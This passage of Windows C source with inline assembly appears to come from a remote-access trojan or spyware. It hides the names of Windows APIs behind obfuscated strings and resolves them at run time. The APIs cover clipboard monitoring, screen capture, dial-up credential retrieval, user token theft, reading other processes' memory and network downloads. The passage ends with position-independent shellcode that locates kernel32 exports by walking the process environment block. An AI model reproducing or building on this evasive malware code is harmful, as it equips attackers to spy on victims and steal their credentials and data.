		PSetFilePointerEx = (pSetFilePointerEx)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW5CyXP2CnWXLuN")); //SetFilePointerEx
		PGetTickCount = (pGetTickCount)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWTC3kY21nW")); //GetTickCount
		PSleep = (pSleep)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "ayXXl")); //Sleep
		PLocalFree = (pLocalFree)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "m236y5LXX")); //LocalFree
		PGlobalFree = (pGlobalFree)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Iy2K6y5LXX")); //GlobalFree
		PGetLastError = (pGetLastError)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWm6UWuLL2L")); //GetLastError
		POutputDebugStringA = (pOutputDebugStringA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "91Wl1WSXK1VaWLCnVv")); //OutputDebugStringA

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "1UXLDrpOyy"));//user32.dll
	if(handle)
	{
		PChangeClipboardChain = (pChangeClipboardChain)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Yh6nVXYyClK26LOYh6Cn"));//ChangeClipboardChain
		PCloseClipboard	= (pCloseClipboard)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Yy2UXYyClK26LO"));//CloseClipboard
		PGetClipboardData=(pGetClipboardData)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWYyClK26LOS6W6"));//GetClipboardData
		PGetForegroundWindow=(pGetForegroundWindow)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW52LXVL21nO0CnO2q"));//GetForegroundWindow
		PCreateWindowExA=(pCreateWindowExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WX0CnO2quNv"));//CreateWindowExA
		PRegisterClassExA=(pRegisterClassExA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXVCUWXLYy6UUuNv"));//RegisterClassExA
		PSetClipboardViewer=(pSetClipboardViewer)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXWYyClK26LOJCXqXL"));//SetClipboardViewer
		PSendMessageA=(pSendMessageA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXnOBXUU6VXv"));//SendMessageA
		PGetPriorityClipboardFormat=(pGetPriorityClipboardFormat)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWPLC2LCWxYyClK26LO52Lg6W"));//GetPriorityClipboardFormat
		PGetWindowTextW=(pGetWindowTextW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW0CnO2qTXNW0"));//GetWindowTextW
		PCloseDesktop=(pCloseDesktop)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Yy2UXSXUkW2l"));//CloseDesktop
		PCloseWindowStation=(pCloseWindowStation)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Yy2UX0CnO2qaW6WC2n"));//CloseWindowStation
		PSetTimer=(pSetTimer)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXWTCgXL"));//SetTimer
		PDispatchMessageA=(pDispatchMessageA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SCUl6W3hBXUU6VXv"));//DispatchMessageA
		PDefWindowProcA=(pDefWindowProcA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXw0CnO2qPL23v"));//DefWindowProcA
		PTranslateMessage=(pTranslateMessage)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "TL6nUy6WXBXUU6VX"));//TranslateMessage
		PPostQuitMessage=(pPostQuitMessage)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "P2UWQ1CWBXUU6VX"));//PostQuitMessage
		PGetMessageA=(pGetMessageA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWBXUU6VXv"));//GetMessageA
		PIsCharAlphaNumericA=(pIsCharAlphaNumericA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cUYh6Lvylh6o1gXLC3v"));//IsCharAlphaNumericA
		POpenClipboard = (pOpenClipboard)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "9lXnYyClK26LO"));//OpenClipboard
		PGetThreadDesktop = (pGetThreadDesktop)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWThLX6OSXUkW2l"));//GetThreadDesktop
		PReleaseDC = (pReleaseDC)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AXyX6UXSY"));//ReleaseDC
		PGetDC = (pGetDC)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWSY"));//GetDC
		POpenDesktopA = (pOpenDesktopA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "9lXnSXUkW2lv")); //OpenDesktopA
		PSetThreadDesktop = (pSetThreadDesktop)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXWThLX6OSXUkW2l")); //SetThreadDesktop
		PSetProcessWindowStation = (pSetProcessWindowStation)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXWPL23XUU0CnO2qaW6WC2n")); //SetProcessWindowStation
		PGetProcessWindowStation = (pGetProcessWindowStation)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWPL23XUU0CnO2qaW6WC2n")); //GetProcessWindowStation
		POpenWindowStationA = (pOpenWindowStationA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "9lXn0CnO2qaW6WC2nv")); //OpenWindowStationA

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "VOCDrpOyy"));//gdi32.dll
	if(handle)
	{
		PGetPixel=(pGetPixel)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWPCNXy"));//GetPixel
		PDeleteDC=(pDeleteDC)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXyXWXSY"));//DeleteDC
		PDeleteObject=(pDeleteObject)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXyXWX9KGX3W"));//DeleteObject
		PGetDIBits=(pGetDIBits)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWSciCWU"));//GetDIBits
		PRealizePalette=(pRealizePalette)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "AX6yCZXP6yXWWX"));//RealizePalette
		PSelectPalette=(pSelectPalette)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXyX3WP6yXWWX"));//SelectPalette
		PGetStockObject=(pGetStockObject)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWaW23k9KGX3W"));//GetStockObject
		PGetDeviceCaps=(pGetDeviceCaps)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWSXzC3XY6lU"));//GetDeviceCaps
		PBitBlt=(pBitBlt)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "iCWiyW"));//BitBlt
		PSelectObject=(pSelectObject)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXyX3W9KGX3W"));//SelectObject
		PCreateDCA=(pCreateDCA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXSYv"));//CreateDCA
		PCreateCompatibleDC=(pCreateCompatibleDC)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXY2gl6WCKyXSY"));//CreateCompatibleDC
		PCreateCompatibleBitmap=(pCreateCompatibleBitmap)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXY2gl6WCKyXiCWg6l"));//CreateCompatibleBitmap
		PGetObjectA = (pGetObjectA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW9KGX3Wv")); //GetObjectA
		PStretchBlt = (pStretchBlt)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aWLXW3hiyW")); //StretchBlt

		handle = NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "Clhyl6lCpOyy"));//iphlpapi.dll
	if(handle)
	{
		PGetAdaptersInfo=(pGetAdaptersInfo)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXWvO6lWXLUcnw2"));//GetAdaptersInfo
		PSendARP=(pSendARP)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXnOvAP")); //SendARP

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "nXW6lCDrpOyy"));//netapi32.dll
	if(handle)
	{
		PNetbios = (pNetbios)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oXWKC2U"));//Netbios

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "L6U6lCDrpOyy"));//rasapi32.dll
	if(handle)
	{
		PRasEnumConnectionsA=(pRasEnumConnectionsA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "A6Uun1gY2nnX3WC2nUv"));//RasEnumConnectionsA
		PRasEnumEntriesA=(pRasEnumEntriesA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "A6Uun1gunWLCXUv"));//RasEnumEntriesA
		PRasGetEntryDialParamsA=(pRasGetEntryDialParamsA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "A6UIXWunWLxSC6yP6L6gUv"));//RasGetEntryDialParamsA

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "Uhyq6lCpOyy"));//shlwapi.dll
	if(handle)
	{
		PSHDeleteValueA=(pSHDeleteValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHSXyXWXJ6y1Xv"));//SHDeleteValueA
		PSHGetValueA=(pSHGetValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWJ6y1Xv"));//SHGetValueA
		PSHSetValueA=(pSHSetValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHaXWJ6y1Xv"));//SHSetValueA

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "UhXyyDrpOyy"));//shell32.dll
	if(handle)
	{
		PSHGetPathFromIDListW=(pSHGetPathFromIDListW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWP6Wh5L2gcSmCUW0"));//SHGetPathFromIDListW
		PSHGetSpecialFolderLocation=(pSHGetSpecialFolderLocation)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWalX3C6y52yOXLm236WC2n"));//SHGetSpecialFolderLocation
		PSHGetSpecialFolderPathA=(pSHGetSpecialFolderPathA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWalX3C6y52yOXLP6Whv"));//SHGetSpecialFolderPathA
		PSHGetSpecialFolderPathW=(pSHGetSpecialFolderPathW)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWalX3C6y52yOXLP6Wh0"));//SHGetSpecialFolderPathW
		PShellExecuteA = (pShellExecuteA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "ahXyyuNX31WXv")); //ShellExecuteA
		PSHGetMalloc = (pSHGetMalloc)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWB6yy23")); //SHGetMalloc
		PSHGetDesktopFolder = (pSHGetDesktopFolder)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aHIXWSXUkW2l52yOXL")); //SHGetDesktopFolder

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "oXW6lCDrpOyy"));//Netapi32.dll
	if(handle)
	{
		PNetUserEnum		=(pNetUserEnum)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oXWdUXLun1g"));//NetUserEnum
		PNetApiBufferFree	=(pNetApiBufferFree)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oXWvlCi1wwXL5LXX"));//NetApiBufferFree

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "2yXDrpOyy"));//ole32.dll
	if(handle)
	{
		PCoCreateInstance	=(pCoCreateInstance)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Y2YLX6WXcnUW6n3X"));//CoCreateInstance
		PCoUninitialize	= (pCoUninitialize)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Y2dnCnCWC6yCZX")); //CoUninitialize
		PCoInitialize = (pCoInitialize)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "Y2cnCWC6yCZX")); //CoInitialize
		PCLSIDFromProgID = (pCLSIDFromProgID)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YmacS5L2gPL2VcS")); //CLSIDFromProgID
	
		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "UXW1l6lCpOyy"));//setupapi.dll
	if(handle)
	{
		PSetupDiCallClassInstaller=(pSetupDiCallClassInstaller)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCY6yyYy6UUcnUW6yyXL"));//SetupDiCallClassInstaller
		PSetupDiDestroyDeviceInfoList=(pSetupDiDestroyDeviceInfoList)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCSXUWL2xSXzC3Xcnw2mCUW"));//SetupDiDestroyDeviceInfoList
		PSetupDiEnumDeviceInfo=(pSetupDiEnumDeviceInfo)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCun1gSXzC3Xcnw2"));//SetupDiEnumDeviceInfo
		PSetupDiGetClassDevsA=(pSetupDiGetClassDevsA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCIXWYy6UUSXzUv"));//SetupDiGetClassDevsA
		PSetupDiGetDeviceRegistryPropertyA=(pSetupDiGetDeviceRegistryPropertyA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCIXWSXzC3XAXVCUWLxPL2lXLWxv"));//SetupDiGetDeviceRegistryPropertyA
		PSetupDiSetClassInstallParamsA=(pSetupDiSetClassInstallParamsA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCaXWYy6UUcnUW6yyP6L6gUv"));//SetupDiSetClassInstallParamsA
		PSetupDiEnumDeviceInterfaces=(pSetupDiEnumDeviceInterfaces)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCun1gSXzC3XcnWXLw63XU"));//SetupDiEnumDeviceInterfaces
		PSetupDiGetDeviceInterfaceDetailA=(pSetupDiGetDeviceInterfaceDetailA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "aXW1lSCIXWSXzC3XcnWXLw63XSXW6Cyv"));//SetupDiGetDeviceInterfaceDetailA

		handle=NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "0Ur_DrpOyy"));//Ws2_32.dll
	if (handle)
	{
		PSendTo=(pSendTo)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "UXnOW2"));//sendto
		Pgethostbyname=(pgethostbyname)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "VXWh2UWKxn6gX"));//gethostbyname
		Psocket=(psocket)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "U23kXW"));//socket
		Precvfrom=(precvfrom)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "LX3zwL2g"));//recvfrom
		Pinet_addr=(pinet_addr)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "CnXW_6OOL"));//inet_addr
		PWSAStartup = (pWSAStartup)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0avaW6LW1l")); //WSAStartup
		Pntohl = (pntohl)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "nW2hy")); //ntohl
		Phtonl = (phtonl)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "hW2ny")); //htonl
		Phtons = (phtons)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "hW2nU")); //htons
		Precv = (precv)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "LX3z")); //recv
		Psend = (psend)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "UXnO")); //send
		Pconnect = (pconnect)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "32nnX3W")); //connect
		Pinet_ntoa = (pinet_ntoa)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "CnXW_nW26")); //inet_ntoa
		Pgethostbyaddr = (pgethostbyaddr)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "VXWh2UWKx6OOL")); //gethostbyaddr
		Pgetprotobyname = (pgetprotobyname)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "VXWlL2W2Kxn6gX")); //getprotobyname
		Psetsockopt = (psetsockopt)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "UXWU23k2lW")); //setsockopt
		PWSAGetLastError = (pWSAGetLastError)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0avIXWm6UWuLL2L")); //WSAGetLastError
	
		handle = NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "qCnCnXWpOyy"));//wininet.dll
	if (handle)
	{
		PInternetOpenA = (pInternetOpenA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLnXW9lXnv"));//InternetOpenA
		PInternetReadFile = (pInternetReadFile)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLnXWAX6O5CyX"));//InternetReadFile
		PInternetCloseHandle = (pInternetCloseHandle)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLnXWYy2UXH6nOyX"));//InternetCloseHandle
		PInternetOpenUrlA = (pInternetOpenUrlA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "cnWXLnXW9lXndLyv"));//InternetOpenUrlA

		handle = NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "0WU6lCDrpOyy"));//Wtsapi32.dll
	if (handle)
	{
		PWTSEnumerateSessionsA = (pWTSEnumerateSessionsA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0Taun1gXL6WXaXUUC2nUv"));//WTSEnumerateSessionsA
		PWTSQueryUserToken = (pWTSQueryUserToken)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0TaQ1XLxdUXLT2kXn")); //WTSQueryUserToken
		PWTSFreeMemory = (pWTSFreeMemory)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "0Ta5LXXBXg2Lx")); //WTSFreeMemory

		handle = NULL;
	}
	
	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "dUXLXnzpOyy"));//Userenv.dll
	if (handle)
	{
		PCreateEnvironmentBlock = (pCreateEnvironmentBlock)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "YLX6WXunzCL2ngXnWiy23k"));//CreateEnvironmentBlock
		PDestroyEnvironmentBlock = (pDestroyEnvironmentBlock)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "SXUWL2xunzCL2ngXnWiy23k"));//DestroyEnvironmentBlock

		handle = NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "nWOyypOyy")); //ntdll.dll
	if (handle)
	{
		PNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oWQ1XLxcnw2Lg6WC2nPL23XUU"));//NtQueryInformationProcess
		PNtWow64QueryInformationProcess64 = (pNtWow64QueryInformationProcess64)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oW02qRFQ1XLxcnw2Lg6WC2nPL23XUURF")); //NtWow64QueryInformationProcess64
		PNtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oWAX6OJCLW16yBXg2Lx")); //NtReadVirtualMemory
		PNtWow64ReadVirtualMemory64 = (pNtWow64ReadVirtualMemory64)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "oW02qRFAX6OJCLW16yBXg2LxRF")); //NtWow64ReadVirtualMemory64

		handle = NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "zXLUC2npOyy")); //version.dll
	if (handle)
	{
		PGetFileVersionInfoA = (pGetFileVersionInfoA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW5CyXJXLUC2ncnw2v")); //GetFileVersionInfoA
		PGetFileVersionInfoSizeA = (pGetFileVersionInfoSizeA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "IXW5CyXJXLUC2ncnw2aCZXv")); //GetFileVersionInfoSizeA
		PVerQueryValueA = (pVerQueryValueA)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "JXLQ1XLxJ6y1Xv")); //VerQueryValueA
		
		handle = NULL;
	}

	handle = LoadLibraryA(DeobStringA(TmpDeStr, 50, "2yX61WDrpOyy")); //oleaut32.dll
	if (handle)
	{
		PSysAllocString = (pSysAllocString)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "axUvyy23aWLCnV")); //SysAllocString
		PSysFreeString = (pSysFreeString)GetProcAddress(handle, DeobStringA(TmpDeStr, 50, "axU5LXXaWLCnV")); //SysFreeString
		handle = NULL;
	}
}

//////////////////////////////////////////////////////////////////////////

DWORD LoadLib = NULL;
DWORD GetProc = NULL;

// HMODULE LoadLibrary(LPCSTR lpLibFileName)
// {
// 	HINSTANCE hd;
// 	__asm
// 	{
// 		push 0x08
// 		push 0x00
// 		mov eax,dword ptr [ebp+8]
// 		push eax
// 		mov edx, [LoadLib]
// 		call edx
// 		mov [hd], eax
// 	}
// 	return hd;
// }

// DWORD GetProcAddress(
// 			   HMODULE hModule,
// 			   LPCSTR lpProcName
//     )
// {
// 	DWORD fd;
// 	__asm
// 	{
// 		mov eax,dword ptr [ebp+12]
// 			push eax
// 			mov eax, [hModule]
// 			push eax
// 			mov edx, [GetProc]
// 			call edx
// 			mov [fd], eax
// 	}
// 	return fd;
// }

char pLoadLibraryExA[20];
char pGetProcAddress[20];

void __declspec(naked) GetLoadFun(LPVOID)
{
	__asm
	{
		PUSHAD
	}
	//LoadLibraryExA
	DeobStringA(pLoadLibraryExA, 20, "m26OmCKL6LxuNv");
	
	//GetProcAddress
	DeobStringA(pGetProcAddress, 20, "IXWPL23vOOLXUU");

 	__asm
	{
		call a12
a12:
		POP  EBP
		LEA  EDI, a12
		SUB  EBP, EDI
		LEA  EDI, pBoolload //¨°??-load ¦Ì?flg
		ADD  EDI, EBP  	
		mov ebx,edi
		mov eax,[ebx]
		test eax,eax
		jz  mystart
		jmp jmpover
jmpover:
		SUB ESP ,14H
		jmp over
			

mystart:
		MOV EAX, DWORD PTR FS:[0x30]
		MOV EAX, DWORD PTR [EAX+0xC]
		MOV ESI,  DWORD PTR [EAX+0x1C]
		LODSD
		MOV EBX,  DWORD PTR [EAX+0x8]  // EBX: KERNEL32.DLL¦Ì??¨´?¡¤
		MOV EAX,  EBX
		ADD EAX,  0x3C
		MOV EAX,  [EAX]
		ADD EAX,  EBX                                 
		// EAX ?¡§??¦Ì? IMAGE_DIRECTORY_ENTRY_EXPORT
		ADD EAX, ((TYPE IMAGE_NT_HEADERS) - ((TYPE IMAGE_DATA_DIRECTORY)*16))
		MOV EAX, [EAX]
		ADD EAX, EBX    // EAX -> ¦Ì?3?¡À¨ª    
		MOV ESI, [EAX + 0x20]
		ADD ESI, EBX    // ESI -> ¦Ì?3?o¡¥¨ºy??¡Á?¦Ì? RVA ¨ºy¡Á¨¦
		
		PUSH ESI
		// int 3
		MOV ECX, 0xB
		CALL a1
a1:
		POP EBP
		LEA EDI, a1
		SUB EBP, EDI
		LEA  EDI, pGetProcAddress
		ADD  EDI, EBP    
		CALL GetProcAddr  // GetProcAddr ?¨² EDX ?D¡¤¦Ì?? GetProcAddress ¦Ì?¦Ì??¡¤
		mov [GetProc], EDX
		POP ESI      
		MOV ECX, 0xC
		CALL a2
a2:
		POP  EBP
		LEA  EDI, a2
		SUB  EBP, EDI
		LEA  EDI, pLoadLibraryExA
		ADD  EDI, EBP    
		CALL GetProcAddr  // GetProcAddr ?¨² EDX ?D¡¤¦Ì?? LoadLibraryExA ¦Ì?¦Ì??¡¤
		mov [LoadLib], EDX
		JMP over

GetProcAddr:    
		MOV EDX, [EAX+0x18] //¨°???¡Á?¦Ì?3?¦Ì?o¡¥¨ºy??¨ºy
FindNext:
		PUSH EDI
		PUSH ECX
		PUSH EDX
		PUSH ESI
		MOV ESI, [ESI]
		ADD ESI, EBX
		CLD
		REPE CMPSB
		POP ESI
		POP EDX
		POP ECX
		POP EDI
		JZ Found
		ADD ESI, 4
		DEC EDX
		JNZ FindNext
			
Found:    
		MOV ECX, [EAX+0x18]
		SUB ECX, EDX
		SAL ECX, 1
		MOV EDX, [EAX+0x24] // ¦Ì?3?o¡¥¨ºyD¨°o?¡À¨ª ¦Ì? RVA
		ADD EDX, EBX
		ADD EDX, ECX
		XOR ECX, ECX
		MOV CX, WORD PTR [EDX]        // ECX <= ¡À¨¤o?
		SAL ECX, 1
		SAL ECX, 1
		MOV EDX, [EAX+0x1C]
		ADD EDX, EBX
		ADD EDX, ECX
		MOV EDX, [EDX]
		ADD EDX, EBX
		RET    
			
pBoolload:
		_emit 0
		_emit 0
		_emit 0
		_emit 0

over:        
		POPAD
		RET 
 }		
}


